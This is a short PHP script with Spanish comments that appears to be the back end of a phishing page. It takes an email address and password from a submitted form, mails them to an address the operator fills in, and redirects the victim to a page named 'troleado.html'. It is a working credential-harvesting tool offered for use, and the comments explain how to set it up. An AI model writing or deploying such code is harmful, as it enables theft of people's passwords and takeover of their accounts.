<?php
    $destino = "EmailTuYo@gmail.com"; // Aqui tienes que poner el email en el cual vas a recivir el mensaje
    $correo = $_POST["email"];//obtenermos del formulario el correo
    $clave = $_POST["cts"]; //obtenmos la contraseña
    $contenido = "Email: " . $correo . "Clave: " . $clave; //creamos un mensaje con la informacion anterior
    $header = "Simón"; // este no es importante
    mail($destino, "Contacto", $contenido, $header); // si no recives la informacion a tu email es por esta funcion tienes es un restricion de tu hosting 
    header("Location:troleado.html");
?>
